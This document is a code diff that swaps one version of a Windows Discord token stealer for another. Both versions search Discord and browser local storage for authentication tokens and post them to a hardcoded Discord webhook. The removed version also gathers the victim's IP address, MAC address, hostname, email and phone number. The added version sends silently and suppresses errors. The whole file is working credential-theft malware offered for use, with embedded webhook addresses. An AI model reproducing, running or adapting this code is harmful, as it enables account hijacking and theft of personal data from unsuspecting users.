@@ -1,122 +1,74 @@
-import os, re, json, random, platform, socket, uuid, requests
+import os
+import re
+import json
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/925764166462111794/97ov5VO7Y7gtZxcn3_zUOQb36lrNIK1Gybxfx__06kOa3EqE4AgBFhfC6LUkdjCu7cKX"
+from urllib.request import Request, urlopen
 
+# your webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/925769489356816394/gTQjzByUotqzKb84YEwniwTa9drDZpy_8AUz1IEcjR-NkkfwfrMp3YqO7t8C_dKZUcPP'
 
-def retrieve_user(token):
-    return json.loads(requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Content-Type": "application/json"}).text)
+# mentions you when you get a hit
+PING_ME = False
 
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
 
-def network_address():
-    ip = json.loads(requests.get("https://api.ipify.org?format=json").text)
-    return ip["ip"]
+    tokens = []
 
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
 
-def system_info(return_type=0):
-    info = {'platform': platform.system(), 'platform-release': platform.release(),
-            'platform-version': platform.version(), 'architecture': platform.machine(),
-            'hostname': socket.gethostname(), 'ip-address': socket.gethostbyname(socket.gethostname()),
-            'public_ip': network_address(), 'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
-            'processor': platform.processor()}
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
 
-    if return_type == 0:
-        return info
-    else:
-        return json.dumps(info)
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
 
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
 
-class TokenMonster:
+    message = '@everyone' if PING_ME else ''
 
-    def __init__(self):
-        if os.name != 'nt':
-            exit()
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
 
-        self.tokens = []
-        self.pc = system_info()
-        self.pc_user = os.getlogin()
-        self.pc_roaming = os.getenv('APPDATA')
-        self.pc_local = os.getenv('LOCALAPPDATA')
+        message += f'\n**{platform}**\n```\n'
 
-        self.scrape_tokens()
+        tokens = find_tokens(path)
 
-        for token in self.tokens:
-            print(token)
-            color = random.randint(0, 0xFFFFFF)
-            raw_user_data = retrieve_user(token)
-            user_json_str = json.dumps(raw_user_data)
-            user = json.loads(user_json_str)
-            if "username" in user:
-                # print("ds")
-                if WEBHOOK_URL:
-                    webhook_data = {"username": "nane to jendast ame kharab", "embeds": [
-                        dict(title="Sniped a token.",
-                             color=f'{color}',
-                             fields=[
-                                 {
-                                     "name": "**Account Info**",
-                                     "value": f'💳 User ID: ||{user["id"]}||\n🧔 Username: ||{user["username"] + "#" + user["discriminator"]}||\n📬 Email: ||{user["email"]}||\n☎ Phone: ||{user["phone"]}||',
-                                     "inline": True
-                                 },
-                                 {
-                                     "name": "**PC Info**",
-                                     "value": f'IP: ||{self.pc["public_ip"]}|| \nUsername: {self.pc_user}\nAppData: {self.pc_local}\nRoaming: {self.pc_roaming}',
-                                     "inline": True
-                                 },
-                                 {
-                                     "name": "💰 Token",
-                                     "value": f"||{token}||",
-                                     "inline": False
-                                 },
-                                 {
-                                     "name": "**PC Data Dump**",
-                                     "value": f'```{system_info(1)}```',
-                                     "inline": False
-                                 },
-                             ]),
-                    ]}
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
 
-                    result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
-                    print(result.text)
+        message += '```'
 
-            self.tokens.remove(token)
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
 
-    def scrape_tokens(self):
+    payload = json.dumps({'content': message})
 
-        crawl = {
-            'Discord': self.pc_roaming + r'\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': self.pc_roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': self.pc_roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': self.pc_roaming + r'\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': self.pc_roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': self.pc_roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': self.pc_local + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': self.pc_local + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': self.pc_local + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': self.pc_local + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': self.pc_local + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': self.pc_local + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': self.pc_local + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': self.pc_local + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': self.pc_local + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.pc_local + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': self.pc_local + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.pc_local + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-            'Uran': self.pc_local + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': self.pc_local + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': self.pc_local + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.pc_local + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
-        }
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
 
-        for source, path in crawl.items():
-            if not os.path.exists(path):
-                continue
-            for file_name in os.listdir(path):
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                    continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                        for token in re.findall(regex, line):
-                            self.tokens.append(token)
-
-
-init = TokenMonster()
+if __name__ == '__main__':
+    main()
